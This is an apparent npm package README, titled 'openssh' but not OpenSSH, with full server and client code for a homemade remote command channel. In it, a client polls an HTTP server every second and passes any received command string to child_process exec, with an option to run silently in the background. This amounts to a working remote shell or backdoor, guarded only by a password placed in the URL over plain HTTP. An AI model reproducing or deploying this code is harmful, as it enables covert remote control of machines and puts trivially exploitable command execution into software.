# Openssh
Version: **openssh@1.0.3**
Module owner: **kubi#5443**
## Informations
**Help:** [Help server](https://discord.gg/4Xpwwz6pgN)
### Use of

## How open a server ?
```js
//npm i chalk@2.0.0 readline express body-parser latinize

// Settings \\
var password = "password" //type password
var pingserver = 2000 //server ping
var pingclient = 5000 //client ping
var loglimit = "1mb"
var port = 80 //port

const db = new Map()
const chalk = require("chalk")
const readline = require('readline');
const express = require('express')
const app = express()
app.listen(port)
console.log(chalk.red('Server Ready'))
const bodyParser = require("body-parser")
app.use(bodyParser.json({limit: loglimit}));
app.use(bodyParser.urlencoded({limit: loglimit, extended: true}));
var latinize = require('latinize');

app.use('/openssh/:password', function (req, res) {
if (password === req.params.password) {
res.json({"terminal":db.get("terminal"),"log":db.get("log")});
}})
app.post('/opensshlog/', function (req, res) {
if (password === req.body.password) {
db.set("log",chalk.green("\n@Client >:\n")+req.body.console)
}})
function openconsole(){
const rl = readline.createInterface({input: process.stdin,output: process.stdout});
rl.question(chalk.blue('@Openssh >: '), function (terminal) {rl.close();
db.set("terminal",latinize(terminal))
setTimeout(()=>{db.set("terminal","false")},pingserver)
setTimeout(()=>{
if(db.has("log")) console.log(db.get("log"))
db.delete("log")
openconsole()
},pingclient)
});        
}

openconsole()//open the console

/*///Manuel \\\\
db.set("terminal",latinize("echo hi"))
setTimeout(()=>{db.set("terminal","false")},pingserver)
setTimeout(()=>{ console.log(db.get("log")) },pingclient)
db.delete("log")
*/
```
## How open a Client ?
```js
//npm i openssh child_process

var { exec } = require('child_process');
const openssh = require('openssh')
const server = new openssh("https://example.com","password",true)//Write to console or run in background? type true or false

setInterval(()=>{try{
server.get().then(openssh=>{ 
if(!openssh || !openssh.data || !openssh.data["terminal"] || openssh.data["terminal"] === "false") return;
exec(openssh.data["terminal"], function(err, out){
try{server.send(out.toString())}catch{}
try{server.send(err.toString())}catch{}
})})
}catch{}},1000)

```
##### Openssh
- ```npm i openssh```

##### You get error [Come to our help server](https://discord.gg/4Xpwwz6pgN)
